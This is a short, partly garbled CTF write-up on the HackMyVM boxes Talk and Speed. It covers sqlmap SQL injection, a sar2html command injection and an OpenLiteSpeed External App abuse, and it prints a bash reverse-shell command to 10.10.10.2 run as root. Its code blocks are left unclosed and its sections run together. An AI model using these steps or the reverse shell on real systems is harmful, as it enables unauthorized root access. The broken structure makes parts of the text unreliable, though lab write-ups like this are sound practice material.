I've done a couple more HackMyVM boxes: Talk and Speed. Talk is Easy rated, Speed is Medium. 

## Talk
Talk was a webapp called chatME which we can find [here](https://www.sourcecodester.com/php/12295/simple-public-chat-room-using-php.html) and if we download it then it doesn't appear to have any input sanitation so is probably open to SQLi. 

{% highlight shell %}

it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y

sqlmap identified the following injection point(s) with a total of 549 HTTP(s) requests:

On the main website we had **sar2html** version 3.2.2 which famously has a command injection [exploit](https://www.exploit-db.com/exploits/47204) in version 3.2.1. On the project [github](https://github.com/cemtan/sar2html) page, it describes the release of 3.2.2:

>sar2html supports Ubuntu 20 now.  
minor fixes

Um, ok. Does the command injection still work? Actually, yes:

Now, we have  **OpenLiteSpeed 1.5.12**. There is an exploit described [here](https://www.exploit-db.com/exploits/49483) for version **1.7.8**, but it also works for our version. Using the webapp, we can go to Server Configuration > External App and edit the (only) entry which is for LiteSpeed SAPI App. In *command* we enter our shell with this syntax:

{% highlight shell %}
fcgi-bin/lsphp5/../../../../../bin/bash -c 'bash -i >& /dev/tcp/10.10.10.2/1234 0>&1'
{% endhighlight %}

and in *Run as User* and *Run as Group* we put **root**. This gets us a shell with GID of 0, but not UID. We also need to save the changes and run a 'graceful' restart to fire the shell. 

{% highlight shell %}
